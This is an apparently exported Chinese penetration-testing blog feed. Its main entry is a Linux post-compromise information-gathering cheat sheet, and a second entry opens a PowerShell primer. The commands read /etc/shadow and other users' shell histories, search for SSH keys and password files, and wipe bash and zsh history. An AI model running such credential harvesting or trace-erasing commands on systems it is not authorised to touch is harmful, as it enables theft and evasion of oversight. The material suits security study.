    <content><![CDATA[<h2 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h2><h3 id="查询系统信息"><a href="#查询系统信息" class="headerlink" title="查询系统信息"></a>查询系统信息</h3><h4 id="查询系统基础信息"><a href="#查询系统基础信息" class="headerlink" title="查询系统基础信息"></a>查询系统基础信息</h4><p>查询主机名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostname</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2&gt;/dev/null,作用是丢弃错误信息</span></span><br><span class="line">hostname 2&gt;/dev/null</span><br></pre></td></tr></table></figure>



<h4 id="查询系统版本"><a href="#查询系统版本" class="headerlink" title="查询系统版本"></a>查询系统版本</h4><p>查询发布版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release</span><br><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure>



<p>查询系统名称</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ubuntu版本</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> kali GNU/Linux Rolling \n \l</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ubuntu 16.04.5 LTS \n \L</span></span><br></pre></td></tr></table></figure>

<h4 id="查询内核版本"><a href="#查询内核版本" class="headerlink" title="查询内核版本"></a>查询内核版本</h4><p>查询系统和内核的所有相关信息</p>
<p>依次为内核名称，主机名，内核版本号，内核版本，硬件架构名称，处理器类型，硬件平台类型，操作系统名称</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 处理器类型和硬件平台类型可能显示为空</span></span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>查询内核信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg |grep Linux</span><br></pre></td></tr></table></figure>

<p>查看内核信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /root | grep vmlinuz</span><br></pre></td></tr></table></figure>

<p>查询CPU信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/cpuinfo</span><br></pre></td></tr></table></figure>



<h4 id="查询磁盘信息"><a href="#查询磁盘信息" class="headerlink" title="查询磁盘信息"></a>查询磁盘信息</h4><p>查询文件系统磁盘的详细信息</p>
<p>包括磁盘名称，内存大小，已用空间，可用空间，挂载点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看本地磁盘信息</span></span><br><span class="line">df -lh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看所有磁盘信息</span></span><br><span class="line">df -ah</span><br></pre></td></tr></table></figure>



<h4 id="查询环境信息"><a href="#查询环境信息" class="headerlink" title="查询环境信息"></a>查询环境信息</h4><p>打印系统环境信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 显示所有的环境变量</span></span><br><span class="line">env</span><br><span class="line"><span class="meta">#</span><span class="bash"> 打印指定变量</span></span><br><span class="line">echo $PATH</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示本地环境变量</span></span><br><span class="line">set</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示和设置环境变量</span></span><br><span class="line">export</span><br></pre></td></tr></table></figure>

<p>显示当前路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>

<p>查询系统默认遍历</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/profile</span><br></pre></td></tr></table></figure>

<p>显示可用的shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>

<p>查看etc下所有配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -la /etc/*.conf</span><br></pre></td></tr></table></figure>

<p>查看打开的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i -n</span><br></pre></td></tr></table></figure>



<h3 id="查询用户信息"><a href="#查询用户信息" class="headerlink" title="查询用户信息"></a>查询用户信息</h3><p>查看当前用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 打印当前登录用户</span></span><br><span class="line">whoami</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打印当前登录用户</span></span><br><span class="line">who</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打印当前登录用户</span></span><br><span class="line">users</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看当前登录用户</span></span><br><span class="line">w</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看当前登录用户</span></span><br><span class="line">finger</span><br></pre></td></tr></table></figure>

<p>查看当前用户ID</p>
<p>包含用户ID，组ID</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>

<p>查询某个用户的ID</p>
<p>包含用户ID，组ID</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">id root</span><br></pre></td></tr></table></figure>

<p>查询管理员用户以及详细信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查询管理员用户</span></span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3==0&#123;print $1&#125;&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查询管理员用户的信息</span></span><br><span class="line">awk -F: &#x27;($3==&quot;0&quot;)&#123;print&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>

<p>查看sudo配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/sudoers</span><br></pre></td></tr></table></figure>

<p>查看sudo可执行和无法执行的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>查询用户和终端的登录情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>

<p>切换用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>

<p>列出所有用户的组</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(cat /etc/passwd 2&gt;/dev/null| cut -d&quot;:&quot; -f1 2&gt;/dev/null);do id $i;done 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>查询所有的用户信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p>查看用户组信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/group</span><br></pre></td></tr></table></figure>

<p>查看用户Hash</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>



<h3 id="查询网络配置"><a href="#查询网络配置" class="headerlink" title="查询网络配置"></a>查询网络配置</h3><p>查询网络配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">/sbin/ifconfig -a</span><br></pre></td></tr></table></figure>

<p>查询网卡配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查询当前网络配置,根据系统版本不同,使用文件不同</span></span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存了本地默认域名和IP,端口对应的关系</span></span><br><span class="line">cat /etc/networks</span><br></pre></td></tr></table></figure>

<p>显示网卡列表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -i</span><br></pre></td></tr></table></figure>

<p>查看DNS配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/resolv.conf</span><br></pre></td></tr></table></figure>

<p>打印DNS系统中FQDN名称中的域名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dnsdomainname -V</span><br></pre></td></tr></table></figure>

<p>查看hosts域名解析文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure>



<h3 id="查询通讯信息"><a href="#查询通讯信息" class="headerlink" title="查询通讯信息"></a>查询通讯信息</h3><p>查询所有链接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -antpx</span><br></pre></td></tr></table></figure>

<p>查询所有TCP链接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -antp</span><br></pre></td></tr></table></figure>

<p>查询所有UDP链接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -anup</span><br></pre></td></tr></table></figure>

<p>查询所有路由信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查询路由表</span></span><br><span class="line">route</span><br><span class="line"><span class="meta">#</span><span class="bash">查询路由表，以ip地址显示</span></span><br><span class="line">route -n</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查询路由表</span></span><br><span class="line">netstat -r</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 路由跟踪</span></span><br><span class="line">tracert 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>查询缓存的地址解析</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp -e</span><br></pre></td></tr></table></figure>



<h3 id="查询服务信息"><a href="#查询服务信息" class="headerlink" title="查询服务信息"></a>查询服务信息</h3><p>查询存在的服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/serivice</span><br><span class="line">systemctl list-units --type=service</span><br></pre></td></tr></table></figure>

<p>查询已经开启的服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl list-units --type=service --state=running</span><br></pre></td></tr></table></figure>

<p>列出服务项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service --status-all</span><br></pre></td></tr></table></figure>

<p>查询对应的服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/serices | grep Java</span><br></pre></td></tr></table></figure>



<h3 id="查询进程信息"><a href="#查询进程信息" class="headerlink" title="查询进程信息"></a>查询进程信息</h3><p>显示所有程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 显示所有进程</span></span><br><span class="line">ps -A</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 以用户的格式显示所有程序,包括非终端的进程</span></span><br><span class="line">ps aux</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 以用户的格式显示所有程序,显示所有终端的进程</span></span><br><span class="line">ps au</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示所有进程,显示UID,PPIP,C与STIME栏位</span></span><br><span class="line">ps -ef</span><br></pre></td></tr></table></figure>

<p>显示当前所有终端运行的进程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps aug</span><br></pre></td></tr></table></figure>

<p>查询某个应用的所有进程信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef | grep java</span><br></pre></td></tr></table></figure>

<p>实时显示占用最多的进程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure>

<p>杀死进程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 默认杀死进程,15</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span> id</span></span><br><span class="line">kill 1003</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 强制杀死进程</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span> 9 id</span></span><br><span class="line">kill 9 1003</span><br></pre></td></tr></table></figure>



<h3 id="查询软件信息"><a href="#查询软件信息" class="headerlink" title="查询软件信息"></a>查询软件信息</h3><p>查询所有安装的软件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br></pre></td></tr></table></figure>

<p>查询某个软件所关联的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg -L xxx</span><br></pre></td></tr></table></figure>



<h3 id="查询软件版本"><a href="#查询软件版本" class="headerlink" title="查询软件版本"></a>查询软件版本</h3><p>查看sudo版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure>

<p>查看Apache版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apache2 -v</span><br></pre></td></tr></table></figure>

<p>查看MySQL版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql --version</span><br></pre></td></tr></table></figure>

<p>查看postgres数据库版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">psql -V</span><br></pre></td></tr></table></figure>

<p>查看perl版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl -v</span><br></pre></td></tr></table></figure>

<p>查看Java版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java --version</span><br></pre></td></tr></table></figure>

<p>查看python版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python --version</span><br><span class="line">python2 --version</span><br></pre></td></tr></table></figure>



<h3 id="查询历史命令"><a href="#查询历史命令" class="headerlink" title="查询历史命令"></a>查询历史命令</h3><p>查询所有的历史命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>

<p>清空所有的历史命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在bash下使用</span></span><br><span class="line">rm -rf ~/.bash_history</span><br><span class="line">history -c</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在zsh下使用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 关闭所有shell,新建一个shell</span></span><br><span class="line">rm -rf ~/zsh_history</span><br><span class="line">cat /dev/null &gt; ~/.zsh_history</span><br></pre></td></tr></table></figure>

<p>查看历史命令文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看root账户的历史命令文件</span></span><br><span class="line">cat /root/.bash_history</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看当前用户的历史命令文件</span></span><br><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.zsh_history</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看其他用户的历史命令文件</span></span><br><span class="line">cat /home/user/.bash_history</span><br></pre></td></tr></table></figure>



<h3 id="查询密码信息"><a href="#查询密码信息" class="headerlink" title="查询密码信息"></a>查询密码信息</h3><p>查询所有用户的密码信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/shadow</span><br></pre></td></tr></table></figure>



<h3 id="查询防火墙信息"><a href="#查询防火墙信息" class="headerlink" title="查询防火墙信息"></a>查询防火墙信息</h3><p>查看防火墙配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 需要root权限</span></span><br><span class="line">sudo iptables -L</span><br></pre></td></tr></table></figure>



<h3 id="查询日志信息"><a href="#查询日志信息" class="headerlink" title="查询日志信息"></a>查询日志信息</h3><p>查询系统日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/log/syslog</span><br></pre></td></tr></table></figure>

<p>查询登录日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看当前登录用户，显示了在线时间</span></span><br><span class="line">w</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打印当前登录用户，显示了最后一次登录时间</span></span><br><span class="line">who</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查询当前登录用户信息</span></span><br><span class="line">cat /var/run/utmp</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示用户最近一次登录信息</span></span><br><span class="line">lastlog</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定用户</span></span><br><span class="line">lastlog -u root</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定10天以前</span></span><br><span class="line">lastlog -b 10</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定10天内</span></span><br><span class="line">lastlog -t 10</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看开机信息</span></span><br><span class="line">sudo dmesg | tail -20</span><br></pre></td></tr></table></figure>

<p>查询web日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/httpd/logs/*</span><br></pre></td></tr></table></figure>

<p>查询系统日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/var/log/*</span><br></pre></td></tr></table></figure>

<p>实时查看更新的日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tail -f xxx.log</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示最后十行</span></span><br><span class="line">tail -n 10 xxx.log</span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示最好十个字符</span></span><br><span class="line">tail -c 10 xxx.log</span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示从第十行到末尾</span></span><br><span class="line">tail +10 xxx.log</span><br><span class="line"><span class="meta">#</span><span class="bash"> 实时显示十行</span></span><br><span class="line">tail -f 10 xxx.log</span><br></pre></td></tr></table></figure>



<h3 id="查询计划任务"><a href="#查询计划任务" class="headerlink" title="查询计划任务"></a>查询计划任务</h3><p>在Linux中，计划任务有两种路径，分别为</p>
<ul>
<li>/var/spool/cron/crontabs ：这个目录以账号来区分每个用户自己的执行计划</li>
<li>/etc/crontab ：系统执行计划，需要在后边加上用户格式</li>
</ul>
<p>查询所有的计划任务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查询当前用户所有的计划任务</span></span><br><span class="line">crontab -l</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查询某个用户的计划任务</span></span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查询其他用户所有的计划任务</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -a显示全部内容,-l显示详细内容,-h以便于阅读的格式显示</span></span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">sudo ls -alh /var/spool/cron/crontabs</span><br><span class="line">ls -la /etc/cron*</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查询所有的系统计划任务文件</span></span><br><span class="line">ls -al /etc/ | grep cron</span><br></pre></td></tr></table></figure>

<p>创建/编辑计划任务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> F1 F2 F3 F4 F5 comman</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> F1 表示分钟,可以写成范围1-60</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> F2 表示小时,可以写成范围1-60</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> F3 表示天数,可以写成范围1-31</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> F4 表示月份,可以写成范围1-12</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> F5 表示星期,可以写成范围1-7</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 每分钟执行一次命令,以root用户的身份,不填写则默认以当前用户</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 输出类需要保存在文件里，不然不会显示</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用户写成root会保存到/etc/crontab,否则会写到/var/spool/cron/crontabs</span></span><br><span class="line">crontab -e</span><br><span class="line">* * * * * root echo &quot;hello&quot; &gt;&gt; /home/kali/Desktop/1.txt</span><br></pre></td></tr></table></figure>

<p>删除计划任务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab -r</span><br></pre></td></tr></table></figure>

<p>重启计划任务服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/crond restart</span><br><span class="line">service crond restart</span><br></pre></td></tr></table></figure>



<h3 id="查找能写或进入的目录"><a href="#查找能写或进入的目录" class="headerlink" title="查找能写或进入的目录"></a>查找能写或进入的目录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null</span><br><span class="line">find / -perm -o+w -type d 2&gt;/dev/null</span><br><span class="line">find / -perm -o+x -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>



<h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><h4 id="通过ICMP协议"><a href="#通过ICMP协议" class="headerlink" title="通过ICMP协议"></a>通过ICMP协议</h4><p>shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for k in $( seq 1 255);do ping -c 1 192.168.1.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#x27;&#123;print $4&#125;&#x27;; done </span><br><span class="line"></span><br><span class="line">for i in 192.168.111.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i is alived; fi; done</span><br></pre></td></tr></table></figure>



<p>netbios 软件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz</span><br><span class="line">tar xf nbtscan-source-1.0.35.tgz</span><br><span class="line">make</span><br><span class="line">chmod +x nbtscan</span><br><span class="line">./nbtscan 192.168.111.1/24</span><br></pre></td></tr></table></figure>



<p>arpscan</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/attackdebris/arpscan.git</span><br><span class="line">make</span><br><span class="line">chmod +x arpscan</span><br><span class="line">./arpscan</span><br></pre></td></tr></table></figure>



<h2 id="Linux-敏感路径"><a href="#Linux-敏感路径" class="headerlink" title="Linux 敏感路径"></a>Linux 敏感路径</h2><p>查找文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查找扩展名为cfg的所有文件</span></span><br><span class="line">find  /  -name *.cfg</span><br></pre></td></tr></table></figure>

<p>查找敏感文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -type f -iname &quot;*.bash_history&quot; -o -iname &quot;*config*&quot; -o -iname &quot;web.xml&quot; -o -iname &quot;*database*&quot; -o -iname &quot;*pass*&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>查找SSH公钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls</span><br></pre></td></tr></table></figure>



<h3 id="网络配置文件"><a href="#网络配置文件" class="headerlink" title="网络配置文件"></a>网络配置文件</h3><table>
<thead>
<tr>
<th align="center">文件</th>
<th align="center">说明</th>
<th align="center">路径</th>
</tr>
</thead>
<tbody><tr>
<td align="center">本地映射文件</td>
<td align="center">保存了本地默认域名和IP,端口对应的关系</td>
<td align="center">/etc/services</td>
</tr>
<tr>
<td align="center">服务搜索顺序文件</td>
<td align="center">规定查找特定类型的顺序</td>
<td align="center">/etc/nsswitch.conf</td>
</tr>
<tr>
<td align="center">全局网卡配置文件</td>
<td align="center">配置主机，IP，网关等</td>
<td align="center">/etc/sysconfig/network</td>
</tr>
<tr>
<td align="center">单个网卡配置文件</td>
<td align="center">配置IP，网关，DNS等</td>
<td align="center">/etc/sysconfig/network-scripts/ifcfg-eth0</td>
</tr>
<tr>
<td align="center">解析查询顺序文件</td>
<td align="center">设置如何解析主机名</td>
<td align="center">/etc/host.conf</td>
</tr>
<tr>
<td align="center">域名解析文件</td>
<td align="center">设置IP和域名的关系</td>
<td align="center">/etc/hosts</td>
</tr>
<tr>
<td align="center">DNS文件</td>
<td align="center">设置DNS配置</td>
<td align="center">/etc/resolv.conf</td>
</tr>
<tr>
<td align="center">网络守护进程服务</td>
<td align="center">xinetd的配置文件</td>
<td align="center">/etc/xinetd.conf<br>/etc/xinetd.d/*</td>
</tr>
<tr>
<td align="center">NFS配置文件</td>
<td align="center">网络共享文件</td>
<td align="center">cat /etc/exports</td>
</tr>
</tbody></table>
<h3 id="Web-应用服务"><a href="#Web-应用服务" class="headerlink" title="Web 应用服务"></a>Web 应用服务</h3><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>查看apache配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure>

<p>查看运行的apache账户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/apache2/envvars</span><br></pre></td></tr></table></figure>

<p>列出加载的apache模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apache2ctl (or apachectl) -M</span><br></pre></td></tr></table></figure>



<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>查看MySQL配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/my.conf</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>内网渗透</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透-PowerShell</title>
    <url>//4bd4a316b518.html</url>
    <content><![CDATA[<h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><p>​        Windows PowerShell 是一种命令行外壳程序和脚本环境，它内置在每个受支持的Windows 版本中（Windows7、Windows Server2008R2及更高版本），为Windows 命令行使用者和脚本编写者利用 <code>.NET Framework</code> 的强大功能提供了便利。只要可以在一台计算机上运行代码，就可以将PowerShell 脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。也可以把PowerShell 看作命令行提示符cmd.exe 的扩展。</p>
<h2 id="PowerShell-的特点"><a href="#PowerShell-的特点" class="headerlink" title="PowerShell 的特点"></a>PowerShell 的特点</h2><ul>
<li>默认安装在Windows 7 以上的操作系统</li>
<li>脚本可以在内存中运行，不需要写入磁盘</li>
<li>几乎不会触发杀毒软件</li>
<li>可以远程执行</li>
<li>存在很多基于 PowerShell 开发的工具</li>
<li>使 Windows 脚本执行变得更加容易</li>
<li>cmd.exe 的运行通常会被阻止，PowerShell 的运行通过不容易被阻止</li>
<li>可以用于管理活动目录</li>
<li>可以直接在cmd中运行PowerShell</li>
</ul>
<h2 id="PS1文件"><a href="#PS1文件" class="headerlink" title=".PS1文件"></a>.PS1文件</h2><p>一个 PowerShell 脚本其实就是一个简单的文本文件，它的扩展名是 <code>.ps1</code></p>
<p>PowerShell 脚本文件中包含一系列 PowerShell 命令</p>
<p>每个命令显示为独立的一行</p>
<h2 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h2><p>为了防止使用者运行恶意脚本，PowerShell 提供了一个执行策略</p>
<p>在默认情况下，这个执行策略被设置为 不能运行</p>
<p>如果 PowerShell 脚本无法运行，可以使用 <code>Get-ExecutionPolicy</code> 命令查询当前执行策略</p>
<table>
<thead>
<tr>
<th align="center">执行策略</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Restricted</td>
<td align="center">脚本不能运行（默认设置）</td>
</tr>
<tr>
<td align="center">RemoteSigned</td>
<td align="center">在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</td>
</tr>
<tr>
<td align="center">AllSigned</td>
<td align="center">仅当脚本由受信任的发布者签名时才能运行</td>
</tr>
<tr>
<td align="center">Unrestricted</td>
<td align="center">允许所有脚本运行</td>
</tr>
<tr>
<td align="center">Bypass</td>
<td align="center">不阻止任何操作，并且没有任何警告或提示</td>
</tr>
<tr>
<td align="center">Default</td>
<td align="center">设置默认的执行策略</td>
</tr>
<tr>
<td align="center">Undefined</td>
<td align="center">当前作用域中没有设置执行策略，或者用来删除当前执行策略</td>
</tr>
</tbody></table>
